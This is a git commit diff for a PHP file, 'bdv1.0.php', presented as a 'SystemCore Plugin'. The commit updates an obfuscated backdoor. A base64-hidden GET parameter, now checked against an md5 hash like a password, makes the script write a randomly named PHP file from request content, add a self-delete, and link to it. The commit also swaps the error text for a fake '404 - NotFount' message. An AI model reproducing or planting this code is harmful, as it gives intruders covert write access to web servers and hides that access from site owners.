f28112fb732c13e1a0e5344bb86c6162b0e49525
given huang <37971883+givenhyh@users.noreply.github.com>
2020-03-07 04:03:20 +0000

    Update bdv1.0.php

--- bdv1.0.php
+++ bdv1.0.php
@@ -1,10 +1,10 @@
 <?php
 //SystemCore Plugin
-if ($_GET[base64_decode('R0lWRU5OQg==')])
+if (md5($_GET[base64_decode('R0lWRU5OQg==')])==base64_decode('OTAxY2ExZGViMjRjNWI4OTY1NDdkZTYyMWExNGE5MDM='))
 {
     $OO0OOOO000 = base64_decode("cmFuZA==")(1000000, 9999999).".php";
-    $O0OO0OOOO0 = base64_decode("Zm9wZW4=")($OO0OOOO000, "w") or die("W D N M D !");
-    $O0OO0OO00O = base64_decode('R0lWRU5OQg==')."<?php @unlink ('".$OO0OOOO000."');?>";
+    $O0OO0OOOO0 = base64_decode("Zm9wZW4=")($OO0OOOO000, "w") or die("404 - NotFount");
+    $O0OO0OO00O = $_GET[base64_decode('R0lWRU5OQg==')]."<?php @unlink ('".$OO0OOOO000."');?>";
     $O0OO00OO00 = base64_decode("ZndyaXRl")($O0OO0OOOO0,$O0OO0OO00O);
     $O0OO0O0O0O = base64_decode("ZmNsb3Nl")($O0OO0OOOO0);
     echo ('<a href="'.$OO0OOOO000.'">Go</a>');
